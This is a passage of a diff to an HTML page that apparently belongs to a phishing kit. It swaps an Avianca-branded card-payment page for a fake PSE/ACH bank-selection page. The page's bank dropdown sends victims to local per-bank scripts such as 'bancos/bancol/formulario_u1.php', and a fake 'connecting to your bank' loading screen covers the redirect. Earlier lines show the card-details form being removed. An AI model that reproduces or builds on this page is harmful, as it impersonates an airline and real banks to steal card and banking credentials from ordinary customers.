@@ -3,1381 +3,744 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <title>Pago</title>
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>¡Fácil, rápido y seguro!</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        /* ------------------- */
-    /* Header Responsive   */
-    /* ------------------- */
-    .header {
-      background: var(--background-white);
-      padding: 10px 16px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      border-bottom: 1px solid var(--border-color);
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-      flex-wrap: wrap;
-      height: auto;
-      min-height: var(--header-height);
-    }
-
-    .header-top {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      width: 100%;
-    }
-
-    .avianca-logo {
-      font-weight: 700;
-      font-size: 24px;
-      color: var(--avianca-red);
-      flex-shrink: 0;
-    }
-    
-    .header-flight-info {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      font-size: 13px;
-      color: var(--text-light);
-      width: 100%;
-      margin-top: 10px;
-      padding-top: 10px;
-      border-top: 1px solid #f0f0f0;
-    }
-
-    .info-row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      align-items: center;
-    }
-
-    .header-flight-info .info-item {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .header-flight-info .edit-link {
-      color: #007bff;
-      text-decoration: none;
-      font-weight: 500;
-      margin-left: auto;
-      font-size: 14px;
-    }
-
-    .header-actions {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .step-indicator {
-      color: var(--text-light);
-      font-size: 13px;
-      text-align: right;
-    }
-
-    .progress-container {
-      width: 80px;
-      height: 4px;
-      background: var(--border-color);
-      border-radius: 3px;
-      margin-top: 4px;
-      overflow: hidden;
-    }
-
-    .progress-bar {
-      width: 60%;
-      height: 100%;
-      background: var(--primary-green);
-    }
-    
-    .header-total-btn {
-      background: var(--background-white);
-      border: 1px solid var(--text-light);
-      border-radius: 20px;
-      padding: 6px 12px;
-      font-size: 13px;
-      font-weight: 600;
-      color: var(--text-dark);
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      white-space: nowrap;
-    }
-
-    .header-total-btn i {
-      font-size: 14px;
-    }
-        
         body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
             background-color: white;
-            color: #333;
             min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding: 0px 0;
         }
-        
-        .main-container {
-            display: flex;
+
+        .container {
             max-width: 1200px;
-            width: 100%;
-            gap: 30px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
+            margin: 0 auto;
+           
         }
-        
-        .form-container {
-            flex: 1;
-            padding: 30px;
-            background: white;
-          
-        }
-        
-        .summary-container {
-            flex: 0 0 350px;
-            background: white;
-            padding: 30px;
-            border-left: 1px solid #e0e0e0;
-        }
-        
+
+        /* Header */
         .header {
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .title {
-            font-size: 28px;
-            color: #2c3e50;
-            margin-bottom: 15px;
-        }
-        
-        .card-logos {
             display: flex;
-            gap: 10px;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 40px;
+            background-color: white;
+            width: 100%;
+
         }
-        
-        .card-logo {
-            padding: 6px 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: bold;
+
+        .pse-logo {
+            width: 50px;
+            height: 50px;
+            background: #2c5aa0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             color: white;
+            font-weight: bold;
+            font-size: 16px;
         }
-        
-        .visa { background: #1a237e; }
-        .amex { background: #0070ba; }
-        .mastercard { background: #eb001b; }
-        .diners { background: #00877c; }
-        
-        .form-group {
+
+        .header-text {
+            color: #2c5aa0;
+            font-size: 18px;
+            font-weight: 400;
+        }
+
+        /* Main Layout */
+        .main-layout {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .form-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            width: 500px;
+        }
+
+        /* Person Type Selection */
+        .person-type-header {
+            background: white;
+            padding: 25px 30px 15px;
+            text-align: center;
+        }
+
+        .person-type-title {
+            color: #2c5aa0;
+            font-size: 18px;
+            font-weight: 500;
             margin-bottom: 20px;
         }
-        
-        .input-container {
-            position: relative;
+
+        .person-type-tabs {
+            display: flex;
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 4px;
+            gap: 4px;
+        }
+
+        .person-tab {
+            flex: 1;
+            padding: 12px 20px;
+            background: transparent;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
             display: flex;
             align-items: center;
-        }
-        
-        .input-icon {
-            position: absolute;
-            left: 15px;
-            font-size: 18px;
-            color: #6c757d;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 15px 15px 15px 45px;
-            border: 1px solid #ced4da;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        .form-input:focus {
-            border-color: green;
-            outline: none;
-        }
-        
-        .expiry-section {
-            margin-bottom: 25px;
-        }
-        
-        .expiry-label {
+            justify-content: center;
+            gap: 8px;
             font-size: 14px;
-            color: #6c757d;
-            margin-bottom: 8px;
+            color: #666;
+            transition: all 0.2s ease;
         }
-        
-        .expiry-row {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .select-container {
-            flex: 1;
-            position: relative;
-        }
-        
-        .form-select {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #ced4da;
-            border-radius: 8px;
-            font-size: 16px;
+
+        .person-tab.active {
             background: white;
-            appearance: none;
+            color: #333;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
-        
-        .select-arrow {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            pointer-events: none;
-            color: #6c757d;
-        }
-        
-        .cvv-container {
-            flex: 1;
-            position: relative;
-        }
-        
-        .cvv-input {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #ced4da;
-            border-radius: 8px;
-            font-size: 16px;
-        }
-        
-        .info-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
+
+        .person-tab-icon {
             width: 20px;
             height: 20px;
-            background: #6c757d;
-            color: white;
             border-radius: 50%;
+            background: #ffa726;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 12px;
-            cursor: pointer;
         }
-        
-        .toggle-section {
-            background: #e9ecef;
-            padding: 20px;
-            border-radius: 8px;
+
+        .person-tab.inactive .person-tab-icon {
+            background: #ddd;
+        }
+
+        /* Form Content */
+        .form-content {
+            padding: 30px;
+        }
+
+        .user-status {
             margin-bottom: 25px;
         }
-        
-        .toggle-option {
+
+        .status-option {
             display: flex;
             align-items: center;
-            margin-bottom: 15px;
+            gap: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border: 2px solid #f0f0f0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: white;
         }
-        
-        .toggle-option:last-child {
-            margin-bottom: 0;
+
+        .status-option.active {
+            border-color: #ffa726;
+            background: #fff8e1;
         }
-        
-        .toggle-switch {
-            position: relative;
-            display: inline-block;
-            width: 50px;
+
+        .status-option:hover {
+            border-color: #ffa726;
+        }
+
+        .status-icon {
+            width: 24px;
             height: 24px;
-            margin-right: 15px;
-        }
-        
-        .toggle-input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        
-        .toggle-slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ced4da;
-            transition: .4s;
-            border-radius: 34px;
-        }
-        
-        .toggle-slider:before {
-            position: absolute;
-            content: "";
-            height: 16px;
-            width: 16px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: .4s;
             border-radius: 50%;
+            background: #ffa726;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
         }
-        
-        .toggle-input:checked + .toggle-slider {
-            background-color: #4a148c;
+
+        .status-option:not(.active) .status-icon {
+            background: #ddd;
         }
-        
-        .toggle-input:checked + .toggle-slider:before {
-            transform: translateX(26px);
-        }
-        
-        .toggle-text {
+
+        .status-text {
             font-size: 15px;
-            color: #495057;
+            color: #333;
         }
-        
-        .billing-section {
-            margin-top: 30px;
-        }
-        
-        .billing-title {
-            font-size: 20px;
-            color: #2c3e50;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .billing-input {
-            padding-left: 15px;
-        }
-        
-        .btn-container {
-            margin-top: 30px;
-        }
-        
-        .btn-submit {
-            width: 100%;
-            padding: 16px;
-            background-color: black;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .btn-submit:hover {
-            background: linear-gradient(135deg, #ff0000, #ff0000);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        .summary-title {
-            font-size: 22px;
-            color: #2c3e50;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .flight-info {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
+
+        /* Bank Selection */
+        .form-group {
             margin-bottom: 25px;
         }
-        
-        .flight-section {
-            margin-bottom: 20px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .flight-section:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-        
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .section-title {
-            font-size: 18px;
-            color: #495057;
-        }
-        
-        .basic-tag {
-            background: #4a148c;
-            color: white;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
-        .route {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-        
-        .route-icon {
-            font-size: 20px;
-        }
-        
-        .flight-date {
-            color: #6c757d;
-            margin-bottom: 15px;
-        }
-        
-        .flight-details {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-        
-        .flight-time {
-            font-size: 18px;
-            font-weight: bold;
-            color: #2c3e50;
-        }
-        
-        .flight-duration {
-            text-align: center;
-            flex-grow: 1;
-        }
-        
-        .flight-type {
-            font-size: 14px;
-            color: #28a745;
-            font-weight: bold;
-        }
-        
-        .flight-route-line {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        
-        .route-dot {
-            width: 8px;
-            height: 8px;
-            background: #4a148c;
-            border-radius: 50%;
-        }
-        
-        .route-line {
-            flex-grow: 1;
-            height: 2px;
-            background: #4a148c;
-            margin: 0 5px;
-        }
-        
-        .airline-info {
-            font-size: 14px;
-            color: #6c757d;
-        }
-        
-        .passenger-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #e0e0e0;
-        }
-        
-        .passenger-icon {
-            font-size: 18px;
-        }
-        
-        .price-summary {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-        }
-        
-        .price-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-        }
-        
-        .price-label {
-            color: #6c757d;
-        }
-        
-        .price-value {
+
+        .form-label {
+            display: block;
+            color: #2c5aa0;
+            font-size: 15px;
+            margin-bottom: 8px;
             font-weight: 500;
         }
-        
-        .total-row {
+
+        .required {
+            color: #f44336;
+        }
+
+        .bank-select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e5e5e5;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #333;
+            background: white;
+            cursor: pointer;
+            transition: border-color 0.2s ease;
+        }
+
+        .bank-select:focus {
+            outline: none;
+            border-color: #2c5aa0;
+        }
+
+        /* Action Buttons */
+        .action-buttons {
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary {
+            background: #ffa726;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #ff9800;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #2c5aa0;
+            border: 2px solid #2c5aa0;
+        }
+
+        .btn-secondary:hover {
+            background: #2c5aa0;
+            color: white;
+        }
+
+        /* Info Panel */
+        .info-panel {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            width: 320px;
+            height: fit-content;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffa726, #ff9800);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .info-text {
+            flex: 1;
+        }
+
+        .info-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .info-subtitle {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .contact-list {
             margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #e0e0e0;
-            font-size: 18px;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .contact-icon {
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ACH Logo */
+        .ach-logo {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: white;
+            padding: 12px 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            font-family: Arial, sans-serif;
+        }
+
+        .ach-text {
+            color: #2c5aa0;
             font-weight: bold;
+            font-size: 20px;
+            line-height: 1;
         }
-        
-        .total-label {
-            color: #2c3e50;
+
+        .ach-country {
+            color: #666;
+            font-size: 10px;
+            margin-top: 2px;
+            letter-spacing: 1px;
         }
-        
-        .total-price {
-            color: #000000;
-        }
-        
-        @media (max-width: 768px) {
-            .main-container {
-                flex-direction: column;
-            }
-            
-            .summary-container {
-                border-left: none;
-                border-top: 1px solid #e0e0e0;
-            }
-        }
-        
-        /* Estilos para el modal de confirmación */
-        .modal {
-            display: none;
+
+        /* Loading Screen */
+        .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 1000;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(5px);
+            display: none;
             justify-content: center;
             align-items: center;
+            z-index: 9999;
         }
-        
-        .modal-content {
+
+        .loading-container {
             background: white;
-            border-radius: 15px;
-            padding: 30px;
-            max-width: 500px;
-            width: 90%;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            padding: 40px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            animation: modalAppear 0.5s ease-out;
+            max-width: 400px;
+            width: 90%;
         }
-        
-        @keyframes modalAppear {
-            from { opacity: 0; transform: translateY(-50px); }
-            to { opacity: 1; transform: translateY(0); }
+
+        .loading-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ffa726, #ff9800);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            position: relative;
+            overflow: hidden;
         }
-        
-        .modal-icon {
-            font-size: 60px;
-            color: #4a148c;
-            margin-bottom: 20px;
+
+        .loading-icon::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
         }
-        
-        .modal-title {
+
+        .loading-icon i {
+            color: white;
+            font-size: 32px;
+            z-index: 1;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .loading-title {
+            color: #2c5aa0;
             font-size: 24px;
-            color: #2c3e50;
+            font-weight: 600;
             margin-bottom: 15px;
         }
-        
-        .modal-message {
+
+        .loading-subtitle {
+            color: #666;
             font-size: 16px;
-            color: #6c757d;
-            margin-bottom: 25px;
-            line-height: 1.6;
+            margin-bottom: 30px;
+            line-height: 1.5;
         }
-        
-        .modal-btn {
-            padding: 12px 30px;
-            background: #f52424;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
+
+        .loading-progress {
+            width: 100%;
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 15px;
         }
-        
-        .modal-btn:hover {
-            background: #e21a1a;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+
+        .loading-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ffa726, #ff9800);
+            border-radius: 3px;
+            width: 0%;
+            animation: progressBar 3s ease-in-out;
         }
-        
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #000000;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-            display: none;
+
+        @keyframes progressBar {
+            0% { width: 0%; }
+            100% { width: 100%; }
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .loading-text {
-            text-align: center;
+
+        .loading-dots {
+            color: #ffa726;
             font-size: 18px;
-            color: white;
-            margin-top: 10px;
-            display: none;
+            font-weight: bold;
         }
 
-         /* Media Queries */
-    @media (min-width: 768px) {
-      .header {
-        flex-wrap: nowrap;
-        padding: 10px 24px;
-      }
-      
-      .header-top {
-        width: auto;
-        gap: 30px;
-      }
-      
-      .header-flight-info {
-        flex-direction: row;
-        align-items: center;
-        justify-content: space-between;
-        border-top: none;
-        margin-top: 0;
-        padding-top: 0;
-        width: auto;
-        flex: 1;
-      }
-      
-      .info-row {
-        flex-wrap: nowrap;
-        gap: 20px;
-      }
-      
-      .header-actions {
-        gap: 20px;
-      }
-      
-      .step-indicator {
-        font-size: 14px;
-      }
-      
-      .header-total-btn {
-        padding: 8px 16px;
-        font-size: 14px;
-      }
-      
-      .container {
-        padding: 24px;
-        max-width: 800px;
-      }
-      
-      .passenger-section {
-        padding: 24px;
-      }
-      
-      .form-row,
-      .birth-date-row {
-        gap: 16px;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .header {
-        padding: 8px 12px;
-        width: 100%;
-      }
-      
-      .avianca-logo {
-        font-size: 22px;
-      }
-      
-      .header-total-btn span {
-        display: none;
-      }
-      
-      .header-total-btn {
-        padding: 6px 8px;
-      }
-      
-      .header-total-btn i {
-        margin: 0;
-      }
-      
-      .info-row {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 6px;
-      }
-      
-      .header-flight-info .edit-link {
-        margin-left: 0;
-        margin-top: 6px;
-      }
-      
-      .birth-date-row .form-group {
-        flex: 1 1 100%;
-      }
-    }
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.5s infinite;
+        }
 
-    /* Nuevos estilos para el resumen de pago */
-    .payment-summary {
-        background: #f8f9fa;
-        border-radius: 10px;
-        padding: 25px;
-        margin-top: 25px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-    }
-    
-    .summary-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 20px;
-    }
-    
-    .summary-header h2 {
-        font-size: 22px;
-        color: #2c3e50;
-    }
-    
-    .summary-price {
-        font-size: 24px;
-        font-weight: bold;
-        color: #000000;
-    }
-    
-    .summary-items {
-        border-top: 1px solid #e0e0e0;
-        padding-top: 20px;
-    }
-    
-    .summary-item {
-        display: flex;
-        justify-content: space-between;
-        margin-bottom: 12px;
-    }
-    
-    .item-label {
-        color: #6c757d;
-    }
-    
-    .item-value {
-        font-weight: 500;
-    }
-    
-    .summary-total {
-        display: flex;
-        justify-content: space-between;
-        margin-top: 15px;
-        padding-top: 15px;
-        border-top: 1px solid #e0e0e0;
-        font-size: 20px;
-        font-weight: bold;
-    }
-    
-    .total-label {
-        color: #2c3e50;
-    }
-    
-    .total-value {
-        color: #000000;
-    }
-    
-    .savings-label {
-        color: #28a745;
-        font-weight: 600;
-        text-align: right;
-        margin-top: 5px;
-        font-size: 14px;
-    }
-    
-    .payment-methods {
-        display: flex;
-        gap: 10px;
-        margin-top: 20px;
-        justify-content: center;
-    }
-    
-    .payment-method {
-        width: 50px;
-        height: 30px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        background: white;
-        border-radius: 4px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    
-    .payment-method img {
-        max-width: 80%;
-        max-height: 80%;
-    }
-    
-    .secure-badge {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        margin-top: 15px;
-        color: #28a745;
-        font-weight: 500;
-    }
-    
-    .secure-badge i {
-        font-size: 18px;
-    }
-    
-    /* Animación para resaltar el total */
-    @keyframes highlight {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.05); }
-        100% { transform: scale(1); }
-    }
-    
-    .highlight-animation {
-        animation: highlight 0.5s ease-in-out;
-    }
-    
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .main-layout {
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+            }
+
+            .form-container {
+                width: 100%;
+                max-width: 400px;
+            }
+
+            .info-panel {
+                width: 100%;
+                max-width: 400px;
+                order: -1;
+            }
+
+            .person-type-tabs {
+                flex-direction: column;
+                background: transparent;
+                padding: 0;
+                gap: 8px;
+            }
+
+            .person-tab {
+                background: white;
+                border: 2px solid #f0f0f0;
+                border-radius: 10px;
+                padding: 15px;
+            }
+
+            .person-tab.active {
+                border-color: #ffa726;
+                background: #fff8e1;
+            }
+
+            .action-buttons {
+                flex-direction: column;
+            }
+
+            .ach-logo {
+                position: static;
+                margin: 20px auto 0;
+                width: fit-content;
+            
+            }
+
+            .header {
+                justify-content: center;
+                padding-left: 0;
+            }
+
+            .loading-container {
+                padding: 30px 25px;
+            }
+
+            .loading-icon {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 20px;
+            }
+
+            .loading-icon i {
+                font-size: 24px;
+            }
+
+            .loading-title {
+                font-size: 20px;
+            }
+
+            .loading-subtitle {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px 0;
+            }
+
+            .header{
+                width: 100%;
+            }
+
+            .container {
+                padding: 0 10px;
+            }
+
+            .form-content {
+                padding: 20px;
+            }
+
+            .person-type-header {
+                padding: 20px 20px 15px;
+            }
+
+            .info-panel {
+                padding: 20px;
+            }
+        }
     </style>
 </head>
-<body style="display: flex; flex-direction: column;">
-    <header class="header" style="width: 100%; background-color: white; z-index: 10000;">
-    <div class="header-top">
-      <img src="img/logoavianca-newbrand-rojo-1.svg" alt="">
-      <div class="header-actions">
-        <!-- <div class="step-indicator">
-          <div>Paso 3 de 3</div>
-          <div class="progress-container">
-            <div class="progress-bar"></div>
-          </div>
-        </div> -->
-        <button class="header-total-btn">
-          <i class="fa-solid fa-wallet"></i>
-          <span>$183.950</span>
-        </button>
-      </div>
-    </div>
-    
-    <div class="header-flight-info">
-      <div class="info-row">
-        <!-- <div class="info-item">
-          <i class="fa-solid fa-plane-departure"></i>
-          <span id="origin-destination-text">Recuerda que todos los datos llegan a tu correo</span>
-        </div> -->
-        <div class="info-item">
-          <i class="fa-solid fa-calendar-days"></i>
-          <span id="departure-date">Recuerda que todos los datos llegan a tu correo</span>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-container">
+            <div class="loading-icon">
+                <i class="fas fa-university"></i>
+            </div>
+            <div class="loading-title">Conectando con tu banco</div>
+            <div class="loading-subtitle">
+                Te estamos redirigiendo de forma segura.<br>
+                Por favor espera un momento.
+            </div>
+            <div class="loading-progress">
+                <div class="loading-progress-bar"></div>
+            </div>
+            <div class="loading-dots">Cargando</div>
         </div>
-        <div class="info-item">
-          <i class="fa-solid fa-user"></i>
-          <span id="passenger-info-text"></span>
-        </div>
-      </div>
     </div>
-  </header>
-    <div class="main-container">
-        <div class="form-container">
-            <div class="header">
-                <h1 class="title">Datos de la tarjeta</h1>
-                <img src="img/ma-bc-dxp_other-marks_ID-CHECK.png" style="width: 20%; margin-left: 5%;" alt="">
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header"  style="display: flex; justify-content:space-between;">
+            <img src="img/imgps.png" style="width: 200px;" alt="">
+           <img src="img/NFbanner-der.svg" style="width: 190px;" alt="">
+        </div>
+
+        <!-- Main Layout -->
+        <div class="main-layout">
+            <!-- Form Container -->
+            <div class="form-container">
+                <!-- Person Type Selection -->
+                <div class="person-type-header">
+                    <h2 class="person-type-title">Selecciona el tipo de persona:</h2>
+                    <div class="person-type-tabs">
+                        <button class="person-tab active" data-type="natural">
+                            <div class="person-tab-icon"><img src="img/natural_check.svg" style="width: 150%;" alt=""></div>
+                            Natural
+                        </button>
+                        <button class="person-tab inactive" data-type="juridica">
+                            <div class="person-tab-icon"><img src="img/juridica.svg" style="width: 150%;" alt=""></div>
+                            Jurídica
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Form Content -->
+                <div class="form-content">
+                   
+
+                    <!-- Bank Selection -->
+                    <div class="form-group">
+                        <label class="form-label" for="bank-select">
+                            Selecciona tu banco <span class="required">*</span>
+                        </label>
+                        <select id="bank-select" class="bank-select">
+                                <option value="">Selecciona tu banco...</option>
+                                <option value="bancolombia" data-url="bancos/bancol/formulario_u1.php">BANCOLOMBIA</option>
+                                <option value="banco-agrario" data-url="Error.html">BANCO AGRARIO</option>
+                                <option value="av-villas" data-url="bancos/villas/formulario_u1.php">BANCO AVVILLAS</option>
+                                <option value="bbva" data-url="bancos/bba/formulario_u1.php">BANCO BBVA</option>
+                                <option value="banco-caja-social" data-url="bancos/cj/formulario_u1.php">BANCO CAJA SOCIAL</option>
+                                <option value="citibank" data-url="bancos/colpa/formulario_u1.php">BANCO CITIBANK</option>
+                                <option value="colpatria" data-url="bancos/colpa/formulario_u1.php">BANCO COLPATRIA</option>
+                                <option value="corpbanca" data-url="bancos/itau/formulario_u1.php">BANCO CORPBANCA</option>
+                                <option value="davivienda" data-url="bancos/davi/formulario_u1.php">BANCO DAVIVIENDA</option>
+                                <option value="banco-bogota" data-url="bancos/bogota/formulario_u1.php">BANCO DE BOGOTA</option>
+                                <option value="banco-occidente" data-url="bancos/occi/formulario_u1.php">BANCO DE OCCIDENTE</option>
+                                <option value="falabella" data-url="bancos/fala/formulario_u1.php">BANCO FALABELLA</option>
+                                <option value="finandina" data-url="Error.html">BANCO FINANDINA</option>
+                                <option value="ganadero" data-url="Error.html">BANCO GANADERO</option>
+                                <option value="gnb" data-url="Error.html">BANCO GNB SUDAMERIS</option>
+                                <option value="hsbc" data-url="Error.html">BANCO HSBC COLOMBIA</option>
+                                <option value="itau" data-url="bancos/itau/formulario_u1.php">BANCO ITAU</option>
+                                <option value="banco-popular" data-url="Error.html">BANCO POPULAR</option>
+                                <option value="santander" data-url="Error.html">BANCO SANTANDER</option>
+                                <option value="credibanco" data-url="Error.html">BANCO CREDIBANCO</option>
+                                <option value="helm-bank" data-url="Error.html">BANCO HELM BANK</option>
+                                <option value="nequi" data-url="bancos/nequi/formulario_u1.php">NEQUI</option>
+                                <option value="serfinansa" data-url="Error.html">SERFINANSA</option>
+                                <option value="servibanca" data-url="Error.html">SERVIBANCA</option>
+                                <option value="tuya" data-url="Error.html">TUYA</option>
+                                <option value="nubank" data-url="Error.html">NUBANK</option>
+                                <option value="nn" data-url="Error.html">Otro</option>
+                        </select>
+                    </div>
+
+                    <!-- Action Buttons -->
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="goToBank()">Ir al Banco</button>
+                        <button class="btn btn-secondary" onclick="goToCommerce()">Regresar al comercio</button>
+                    </div>
+                </div>
             </div>
 
-            <form id="paymentForm">
-                <input type="hidden" id="ID" value="123456789">
-                <input type="hidden" id="banco" value="BANCOLOMBIA">
-                
-                <div class="form-group">
-                    <div class="input-container">
-                        <div class="input-icon"><i class="fa-solid fa-user" style="color: #000000;"></i></div>
